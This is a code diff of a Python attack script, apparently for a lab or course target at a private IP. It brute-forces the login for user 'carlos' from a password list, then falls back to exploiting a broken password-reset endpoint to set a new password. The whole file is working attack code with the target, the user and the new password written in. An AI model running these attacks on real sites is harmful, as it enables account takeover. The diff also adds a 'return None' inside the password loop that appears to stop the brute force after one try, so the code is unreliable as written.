@@ -1,14 +1,10 @@
 import requests
 
-BASE_URL = "http://192.168.56.1/CyberProject/" 
-LOGIN_URL = BASE_URL + "login.php" 
-RESET_URL = BASE_URL + "reset_password.php"
+DEFAULT_BASE = "http://192.168.56.1/CyberProject/" 
 
-TARGET_USER = "carlos"
-NEW_PASSWORD = "123123"
-
-def try_brute_force(filename="passwords.txt"):
-    print(f"[*] Step 1: Starting Brute Force from file: {filename}")
+def try_brute_force(user="carlos", filename="passwords.txt", base_url=DEFAULT_BASE):
+    login_url = base_url + "login.php"
+    print(f"[*] Step 1: Starting Brute Force for {user} from file: {filename}")
     
     try:
         with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
@@ -19,44 +15,53 @@ def try_brute_force(filename="passwords.txt"):
                     continue
                 
                 data = {
-                    'username': TARGET_USER,
+                    'username': user,
                     'password': password,
                     'login_submit': ''
                 }
                 
                 try:
                     # use timeout to prevent hanging on slow responses
-                    response = requests.post(LOGIN_URL, data=data, allow_redirects=False, timeout=5)
+                    response = requests.post(login_url, data=data, allow_redirects=False, timeout=5)
                     
                     if response.status_code == 302 or "home.php" in response.headers.get('Location', ''):
                         print(f"\n[!!!] SUCCESS! Found password in file: {password}")
-                        return True
+                        return password
                         
                 except requests.exceptions.RequestException:
                     print(f"[!] Connection error testing password: {password}")
                     continue
+
+                return None
                     
     except FileNotFoundError:
         print(f"[!] Error: The file {filename} was not found.")
-        return False
 
     print("[-] Brute force finished. No password from the file worked.")
-    return False
+    return None
 
-def run_reset_exploit():
+def run_reset_password(user="carlos", new_pwd="123123", base_url=DEFAULT_BASE):
+    reset_url = base_url + "reset_password.php"
     print(f"\n[*] Step 2: Falling back to Broken Password Reset...")
-    params = {'user': TARGET_USER}
-    data = {'new_password': NEW_PASSWORD}
+    params = {'user': user}
+    data = {'new_password': new_pwd}
     
     try:
-        response = requests.post(RESET_URL, params=params, data=data)
-        if response.status_code == 200 and f"<strong>{TARGET_USER}</strong>" in response.text:
-            print(f"[+] Reset successful! New password: {NEW_PASSWORD}")
+        response = requests.post(reset_url, params=params, data=data)
+        if response.status_code == 200 and f"<strong>{user}</strong>" in response.text:
+            print(f"[+] Reset successful! New password: {new_pwd}")
+            return new_pwd
         else:
             print("[-] Reset attack failed.")
     except Exception as e:
         print(f"[!] Connection error: {e}")
+    return None
+
+def standalone_attack(target="carlos"):
+    pwd = try_brute_force(user=target)
+    if not pwd:
+        pwd = run_reset_password(user=target)
+    return pwd
 
 if __name__ == "__main__":
-    if not try_brute_force():
-        run_reset_exploit()
+    standalone_attack()
